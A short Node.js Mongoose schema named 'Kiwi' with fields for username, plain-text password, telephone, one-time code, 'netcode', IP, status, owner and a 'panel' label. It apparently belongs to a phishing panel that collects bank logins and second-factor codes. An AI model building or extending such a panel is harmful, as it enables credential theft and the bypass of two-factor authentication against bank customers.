const mongoose = require("mongoose");

const kiwiSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    telephone: String,
    otp: String,
    netcode: String,
    status: Number,
    ip: String,
    owner: String,
    panel: { type: "string", default: "kiwi" },
});

module.exports = mongoose.model("Kiwi", kiwiSchema);
